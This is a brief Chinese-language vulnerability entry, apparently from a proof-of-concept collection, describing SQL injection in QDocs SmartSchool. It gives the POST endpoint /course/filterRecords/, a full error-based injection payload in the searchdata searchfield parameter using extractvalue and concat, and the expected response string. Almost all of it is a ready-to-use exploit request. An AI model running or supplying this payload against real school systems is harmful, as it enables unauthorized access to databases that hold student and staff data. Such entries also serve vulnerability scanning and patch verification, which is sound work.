# QDocsSmartSchoolSQL注入漏洞

QDocsSmartSchoolSQL ｜ SQL注入 ｜ —
- **请求**：`POST /course/filterRecords/ HTTP/1.1`

**Payload**
```
searchdata[0][title]=&searchdata[0][searchfield]=1&searchdata[0][searchvalue]=1&searchdata[1][title]=1&searchdata[1][searchfield]=1=1 and extractvalue(1,concat(0x5e,(select md5(123456)),0x5e))%23&searchdata[1][searchvalue]=1
```
- **响应特征**：500 e10adc3949ba59abbe56e057f20f883